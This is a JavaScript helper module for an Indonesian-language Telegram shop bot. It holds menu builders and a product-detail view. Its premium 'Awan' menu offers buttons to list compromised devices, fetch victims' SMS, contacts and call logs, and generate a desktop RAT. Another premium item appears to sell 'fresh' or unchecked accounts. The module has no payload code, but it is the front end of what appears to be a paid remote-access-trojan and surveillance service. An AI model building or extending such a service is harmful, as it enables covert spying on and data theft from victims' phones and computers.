const config = require('./config');
const Product = require('./models/product');
const mongoose = require('mongoose');

function createInlineKeyboard(buttons) {
    const keyboard = [];
    let row = [];
    for (const button of buttons) {
        row.push({ text: button.text, callback_data: button.callback_data || undefined, url: button.url || undefined });
        if (row.length === 2) {
            keyboard.push(row);
            row = [];
        }
    }
    if (row.length > 0) {
        keyboard.push(row);
    }
    return { inline_keyboard: keyboard };
}

function isAdmin(chatId) {
    return chatId.toString() === config.adminId;
}

async function sendStartMessage(bot, chatId, isAdminUser = false, isUserbot = false, isPremiumUser = false) {
    let message = `\`\`\`${config.botDescription}\`\`\`\n\nSilakan pilih opsi:`;
    let buttons = [];

    // Tombol standar
    buttons.push(
        { text: "🖼️ Send Images (Premium)", callback_data: "premium_menu" },
        { text: "🛍️ Produk", callback_data: "product" },
        { text: "👤 Daftar", callback_data: "register" },
        { text: "👤 Profil", callback_data: "profile" },
        { text: "📜 All Menu", callback_data: "all_menu" },
        { text: "💬 Live Chat", url: `${config.botBaseUrl}/live-chat/${chatId}` },
        { text: "⬇️ Menu Unduhan", callback_data: "download_menu" },
        { text: "💌 Menfess", callback_data: "menfess" },
        { text: "💌 Confess", callback_data: "confess" },
        { text: "📝 Saran", callback_data: "saran" },
        { text: "🚨 Laporan", callback_data: "laporan" }
    );

    if (!isUserbot) {
        buttons.push({ text: "🤖 Claim Trial Userbot", callback_data: "claim_trial_userbot" });
    }
    if (isPremiumUser) {
        buttons.push({ text: "Akses Unchek/Akun Fresh", callback_data: "unchek_menu" });
        buttons.push({ text: "☁️ Awan Premium", callback_data: "awan_premium_menu" });
    }
    if (isAdminUser) {
        buttons.push({ text: "👑 Admin Menu", callback_data: "admin_menu" });
    }

    buttons.push({ text: "👑 Owner", url: `t.me/${config.ownerUsername}` });
    buttons.push({ text: "👥 Grup", url: config.groupLink });
    bot.sendMessage(chatId, message, { parse_mode: "Markdown", reply_markup: createInlineKeyboard(buttons) });
}

function isValidImageUrl(url) {
    return typeof url === 'string' && (url.startsWith('http://') || url.startsWith('https://')) && /\.(jpg|jpeg|png|gif)$/i.test(url);
}

async function showProductDetail(bot, chatId, productId) {
    try {
        if (!mongoose.Types.ObjectId.isValid(productId)) {
            return bot.sendMessage(chatId, "ID produk tidak valid.");
        }
        const product = await Product.findById(productId);
        if (!product) {
            return bot.sendMessage(chatId, "Produk tidak ditemukan.");
        }

        if (isValidImageUrl(product.imageUrl)) {
            await bot.sendPhoto(chatId, product.imageUrl);
        } else {
            console.error("URL gambar tidak valid:", product.imageUrl);
            bot.sendMessage(chatId, "Gambar produk tidak tersedia.");
        }

        let message = `*${product.name}*\n\n`;
        message += `Kategori: ${product.category}\n`;
        message += `Harga: Rp ${product.price}\n`;
        message += `Deskripsi: ${product.description}\n\n`;
        message += `Link Produk: [Buka Produk](https://t.me/${config.botUsername}?start=${product._id})\n\n`;
        message += `Beli?`;

        const buttons = [
            { text: "Beli", callback_data: `buy_${product._id}` },
            { text: "Wishlist", callback_data: `wishlist_add_${product._id}` },
            { text: "Cart", callback_data: `cart_add_${product._id}` },
            { text: "Kembali ke Kategori", callback_data: "back_to_categories" },
        ];
        bot.sendMessage(chatId, message, {
            parse_mode: "Markdown",
            reply_markup: createInlineKeyboard(buttons),
            disable_web_page_preview: true,
        });
    } catch (error) {
        console.error("Gagal menampilkan detail produk:", error);
        bot.sendMessage(chatId, "Gagal menampilkan detail produk.");
    }
}

async function sendAwanStartMessage(bot, chatId) {
    let message = "Selamat datang di fitur Awan! Fitur premium khusus untuk Anda.";
    let buttons = [
        { text: "List Devices", callback_data: "awan_list_devices" },
        { text: "Get SMS", callback_data: "awan_get_sms" },
        { text: "Get Contacts", callback_data: "awan_get_contacts" },
        { text: "Get Call Logs", callback_data: "awan_get_call_logs" },
        { text: "💻 Generate Desktop RAT", callback_data: "awan_generate_desktop_rat" },
        { text: "Kembali", callback_data: "back_to_start" }
    ];
    bot.sendMessage(chatId, message, { parse_mode: "Markdown", reply_markup: createInlineKeyboard(buttons) });
}

module.exports = {
    createInlineKeyboard,
    isAdmin,
    sendStartMessage,
    showProductDetail,
    sendAwanStartMessage
};
